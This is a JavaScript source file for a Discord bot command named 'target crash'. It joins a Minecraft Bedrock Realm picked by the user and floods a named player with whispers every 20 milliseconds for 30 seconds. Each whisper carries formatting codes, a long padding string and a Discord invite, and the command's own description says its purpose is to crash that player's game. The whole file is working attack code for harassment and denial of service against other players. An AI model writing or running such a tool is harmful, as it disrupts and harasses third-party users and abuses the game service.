const Command = require("../_/Command.js");

const RealmApi = require('../../Classes/Realm.js')
const Client = require('../../Classes/Client.js')

class TargetCrash extends Command {
    subCommand = "target";
    linkOnly = true;

    constructor() {
        super("crash", "Target someone to crash, in-game.", [
            ...require('../../Data/InputBlock.json'),
            {
                type: 3,
                name: "target",
                description: "The user to target for crashing.",
                required: true,
                min_value: 1,
                max_value: 20
            }
        ]);
    }

    /**
     * @param {import("discord.js").CommandInteraction} interaction
     * @param {{ components: import("../../Classes/DiscordJS/Component.js") }} helpers
     */
    async execute(interaction, { components, args }) {
        const { input, target } = args;
        Object.assign(this, { interaction, components });

        await interaction.deferReply({ flags: this.flags });

        if (this.maps.inGame.has(interaction.user.id))
            return this.fastReply("Already in game.", "You are already doing a in-game command, please wait for it to finish before doing another one.");
        this.maps.inGame.set(interaction.user.id, { type: "targetCrash", input, stage: "testingRealm", client: null });

        try {
            const realmApi = new RealmApi(interaction.dbUser);
            await realmApi.init();

            let realm = /^\d+$/.test(input)
                ? await realmApi.getRealmInfoByID(input, true)
                : await realmApi.getRealmInfo(input, false, true);

            if (realm?.errorMsg) return this.invalidApiResponse(realm, input);

            let host = await realmApi.getRealmIP(realm?.id, true);
            if (host?.errorMsg) return this.invalidApiResponse(host, input);
            realm.address = host.address;

            const client = new Client(realmApi, realm, interaction.dbUser);
            if (this.maps.inGame.get(interaction.user.id).disconnect)
                client.destroyClient('User requested close before client connection.', 'fastClose');

            this.maps.inGame.get(interaction.user.id).client = client;

            client.timeouts.push(setTimeout(() => {
                client.destroyClient("Client timeout, Client -> Server closed.", "connectionVoided")
                this.maps.inGame.delete(interaction.user.id)
            },
                5 * 60000));

            client.on('start_game', async () => {
                components
                    .reset()
                    .separator()
                    .text(
                        `### Target Crash.\n` +
                        `-# perxa has connected to **${realm.name}** *(${realm.id})*, and is attempting to target crash ***${target.toLowerCase()}***.` +
                        ` The bot will disconnect automatically **<t:${Math.floor(Date.now() / 1000) + 30}:R>**.\n\n` +
                        `-# **You can run  \` / cancel \`  at any time for the bot to disconnect instantly.**`
                    )
                    .separator();

                await interaction.editReply({ components, flags: this.flags });

                client.intervals.push(setInterval(() =>
                    client.sendCommand(`w "${target}" §fmake me §d§l§iblush §r§f:3\n§r${"".repeat(120)}\n§f§ldiscord.gg/§dnethernet :)`, "automationplayer", 65, 2),
                    20));

                client.timeouts.push(setTimeout(() => client.destroyClient("Client time reached, perxa closed connection.", "defaultClose"), 30 * 1000))
            });

            client.once('clientClosed', async ({ reason }) => this.closedComponent(realm, reason, client));
        } catch (error) {
            console.error(error);
        }
    }
}

module.exports = TargetCrash;